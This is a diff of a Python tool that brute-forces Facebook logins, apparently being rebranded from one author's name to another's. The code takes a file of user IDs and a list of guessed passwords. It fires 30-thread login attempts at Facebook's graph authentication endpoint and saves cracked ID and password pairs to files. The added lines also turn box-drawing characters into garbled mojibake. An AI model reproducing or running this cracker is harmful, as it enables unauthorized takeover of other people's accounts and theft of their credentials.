@@ -31,7 +31,7 @@ def logo():
     print(banner)
 
 def linex():
-    print(f"{w}═══════════════════════════════════════════════")
+    print(f"{w}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•")
 
 def main():
     logo()
@@ -43,7 +43,7 @@ def main():
     if x == "1":
         start()
     elif x == "2":
-        os.system("xdg-open https://github.com/ASMAT-404")
+        os.system("xdg-open https://github.com/Kazim-404")
         main()
     elif x == "3":
         linex()
@@ -59,7 +59,7 @@ def main():
 
 def start():
     logo()
-    print(f" {oo('!')} Example : {g}/sdcard/file.txt ")
+    print(f" {oo('â€¢')} Example : {g}/sdcard/file.txt ")
     linex()
     try:
         file_path = input(f" {oo('?')} File Path : ")
@@ -77,27 +77,27 @@ def start():
     except ValueError:
         ps_limit = 5
     logo()
-    print(f" {oo('!')} Example : {g}first123, first1234, first12345 ")
+    print(f" {oo('â€¢')} Example : {g}first123, first1234, first12345 ")
     linex()
     ps_list = []
     for x in range(ps_limit):
         ps_ask = input(f" {oo(x+1)} Enter Password : ")
         ps_list.append(ps_ask)
-    with speed_x(max_workers=30) as ASMAT:
+    with speed_x(max_workers=30) as kazim:
         logo()
         total_idz = str(len(idz))
-        print(f" {oo('!')} Total Accounts : {g}{total_idz} ")
+        print(f" {oo('â€¢')} Total Accounts : {g}{total_idz} ")
         print(f" {oo('!')} Brute Has Been Started ")
         print(f" {oo('!')} {r}Use Flight Mode For Speed Up ")
         linex()
         for x in idz:
             uid, name = x.split("|")
             pww = ps_list
-            ASMAT.submit(cracker, uid, name, pww, total_idz)
+            kazim.submit(cracker, uid, name, pww, total_idz)
     linex()
-    print(f" {oo('!')} Process Completed ")
-    print(f" {oo('!')} Total Ok Accounts : {g}{str(len(oks))} ")
-    print(f" {oo('!')} Total Cp Accounts : {r}{str(len(cps))} ")
+    print(f" {oo('â€¢')} Process Completed ")
+    print(f" {oo('â€¢')} Total Ok Accounts : {g}{str(len(oks))} ")
+    print(f" {oo('â€¢')} Total Cp Accounts : {r}{str(len(cps))} ")
     linex()
     input(f" {oo('!')} Press enter to back ")
     exit()
@@ -203,13 +203,13 @@ def cracker(uid, name, pww, total_idz):
             url = "https://b-graph.facebook.com/auth/login"
             result = requests.post(url, data=data, headers=headers).json()
             if "session_key" in result:
-                print(f" {g}[ASMAT-OK] {uid}|{ps}")
-                open("/sdcard/ASMAT-Ok.txt", "a").write(f"{uid}|{ps}")
+                print(f" {g}[KAZIM-OK] {uid}|{ps}")
+                open("/sdcard/Kazim-Ok.txt", "a").write(f"{uid}|{ps}")
                 oks.append(uid)
                 break
             elif "www.facebook.com" in result["error"]["message"]:
-                print(f" {r}[ASMAT-CP] {uid}|{ps}")
-                open("/sdcard/ASMAT-Cp.txt", "a").write(f"{uid}|{ps}")
+                print(f" {r}[KAZIM-CP] {uid}|{ps}")
+                open("/sdcard/Kazim-Cp.txt", "a").write(f"{uid}|{ps}")
                 cps.append(uid)
                 break
             else:
@@ -220,16 +220,18 @@ def cracker(uid, name, pww, total_idz):
     except:
         pass
 
-logo = f"""{w}\
-\033[0;32m┏┓┏┓┳┳┓  ┏┓┏┳┓
-\033[0;32m┣┫┗┓┃┃┃  ┣┫   ┃ 
-\033[0;32m┛┗┗┛┛   ┗  ┛┗   ┻ 
-         
-\033[0;32m═══════════════════════════════════════════════
-\033[1;37m Author  : ASMAT KHAN
-\033[1;37m GitHub  : https://github.com/asmatytofficialgithub
-\033[1;37m Version : 0.1
-\033[0;32m═══════════════════════════════════════════════\
+banner = f"""{w}\
+{w}  db   dD  .d8b.  d88888D d888888b .88b  d88. 
+{w}  88 ,8P' d8' `8b YP  d8'   `88'   88'YbdP`88 
+{g}  88,8P   88ooo88    d8'     88    88  88  88 
+{g}  88`8b   88~~~88   d8'      88    88  88  88 
+{w}  88 `88. 88   88  d8' db   .88.   88  88  88 
+{w}  YP   YD YP   YP d88888P Y888888P YP  YP  YP 
+{w}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+ {oo('â€¢')} Author  : Muhammad Kazim
+ {oo('â€¢')} GitHub  : https://github.com/Kazim-404
+ {oo('â€¢')} Version : 0.1
+{w}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\
 """
 
 main()
